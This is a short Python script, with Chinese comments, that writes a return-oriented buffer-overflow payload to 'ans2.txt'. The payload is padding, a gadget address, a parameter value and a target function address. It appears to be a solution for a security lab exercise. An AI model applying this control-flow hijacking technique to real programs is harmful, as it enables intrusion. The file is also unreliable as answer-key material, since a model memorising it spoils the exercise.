import struct

def main():
    # Padding
    padding = b'A' * 16

    # Gadget 地址
    gadget_addr = struct.pack('<Q', 0x4012c7)

    # 参数值
    param_val = struct.pack('<Q', 0x3f8)

    # 目标函数地址
    func2_addr = struct.pack('<Q', 0x401216)

    # 组合 Payload
    payload = padding + gadget_addr + param_val + func2_addr

    with open("ans2.txt", "wb") as f:
        f.write(payload)
        
    print(f"Payload 已生成到 ans2.txt，总长度: {len(payload)} 字节")

if __name__ == "__main__":
    main()